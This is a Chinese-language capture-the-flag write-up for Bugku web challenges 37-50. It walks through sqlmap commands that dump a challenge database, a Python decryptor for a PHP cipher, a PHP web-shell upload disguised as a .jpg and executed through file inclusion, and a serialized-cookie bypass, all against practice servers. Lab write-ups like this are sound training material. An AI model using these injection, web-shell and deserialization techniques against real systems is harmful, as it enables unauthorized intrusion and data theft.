web部分的37-50题

# 这是一个神奇的登陆框

![这是一个神奇的登陆框](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86.png)

首先进行抓包，如上图所示，输入admin和123456，保存为1.txt，放在 E:\杂\c加加 目录下，然后用`sqlmap`进行注入。

```bash
# 使用下面的命令爆破出了数据库名称为 bugkusql1
sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -p admin_name --dbs

# 结果
available databases [2]:
[*] bugkusql1
[*] information_schema
```

```bash
# 使用下面的命令进行爆表
sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -D bugkusql1 -p admin_name --tables

# 结果
Database: bugkusql1
[2 tables]
+--------+
| flag1  |
| whoami |
+--------+
```

```bash
# 使用下面的命令爆列名
sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -D bugkusql1 -T flag1 -p admin_name --columns

# 结果
Database: bugkusql1
Table: flag1
[1 column]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag1  | varchar(50) |
+--------+-------------+
```

```bash
# 使用下面的命令查字段

sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump

# 结果
Database: bugkusql1
Table: flag1
[1 entry]
+----------------------------------+
| flag1                            |
+----------------------------------+
| ed6b28e684817d9efcaf802979e57aea |
+----------------------------------+
```

爆出了flag。

# PHP_encrypt_1(ISCCCTF)

题目给了一段密文：fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=

还有一个压缩包，解压后发现了下面的php代码

```php
<?php
function encrypt($data,$key)
{
    $key = md5('ISCC');
    $x = 0;
    $len = strlen($data);
    $klen = strlen($key);
    for ($i=0; $i < $len; $i++) { 
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x];
        $x+=1;
    }
    for ($i=0; $i < $len; $i++) {
        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
    }
    return base64_encode($str);
}
?>
```

写出相应的脚本如下，运行下面的解密代码即可得到flag

```python
import base64
import hashlib


def decrypt(b64):
    b64 = str(base64.b64decode(b64), encoding='utf8')  # base64转换后是byte类型数据
    key = 'ISCC'
    m = hashlib.md5()
    m.update(key.encode())
    md = m.hexdigest()
    b64_len = len(b64)
    x = 0
    char = ''
    for i in range(b64_len):  # strlen($str)==strlen($char)==strlen($data)
        if x == len(md):
            x = 0
        char += md[x]
        x += 1
    data = ''
    # 也可不进行正负判断：data += chr((ord(b64[i]) - ord(char[i])+128) % 128)
    for i in range(b64_len):
        d = ord(b64[i]) - ord(char[i])
        if d > 0:  # 进行判断，如果相减小于0，说明需要加上128
            data += chr(d)
        else:
            data += chr(d + 128)
    print(data)


if __name__ == "__main__":
    b64 = 'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='
    decrypt(b64)

```

# 文件包含2

查看源码，发现注释中有 upload.php 的提示，于是打开 http://123.206.31.85:49166/upload.php，发现是文件上传。

在php文件里写入 `<script language=php>system("ls")</script>` ，列当前目录，修改后缀名为jpg,如1.php;.jpg,上传成功，如下图所示：

![文件包含2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2.png)

访问 http://123.206.31.85:49166/index.php?file=upload/201911191206089664.jpg，提示我们：about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php。

然后访问 http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt，得到flag

# flag.php

提示：hint，于是在URL后面加一个hint参数 http://123.206.87.240:8002/flagphp/?hint=1，得到了下面的php代码。变成一道代码审计题了，要我们在COOKIE字段中添加ISecer参数,值是$KEY序列化后的值。

**其中有三个地方需要注意：**

**1、需要用到cookie注入**

**2、cookie注入时的payload要用到反序列化**

**3、反序列化后还需要与$KEY类型相同，因为是“$KEY”，所以我们提交的cookie得是一个空字符串**

```php
<?php
error_reporting(0);
include_once("flag.php");
$cookie = $_COOKIE['ISecer'];
if(isset($_GET['hint'])){
    show_source(__FILE__);
}
elseif (unserialize($cookie) === "$KEY")
{   
    echo "$flag";
}
else {
?>

<?php
}
$KEY='ISecer:www.isecer.com';
?>
```

写个script，把$KEY序列化后的值打印出来

```php
<?php
  $KEY = '';
  $cookie = serialize($KEY);
  echo $cookie;
?>
```

运行上面的代码，输出：`s:0:"";` 然后进行burpsuite 抓包，如下图所示，得到了flag

![flag.php](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/flagphp.png)

# sql注入2

题目网站：http://123.206.87.240:8007/web2/

直接在后面加上 flag，即http://123.206.87.240:8007/web2/flag，然后下载了一个文件结果就是flag，但是不知道是什么原因，御剑没有扫出来。

# Trim的日记本

使用御剑扫描出来下面的结果，然后打开发现flag，竟然真的是flag

![Trim的日记本](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC.png)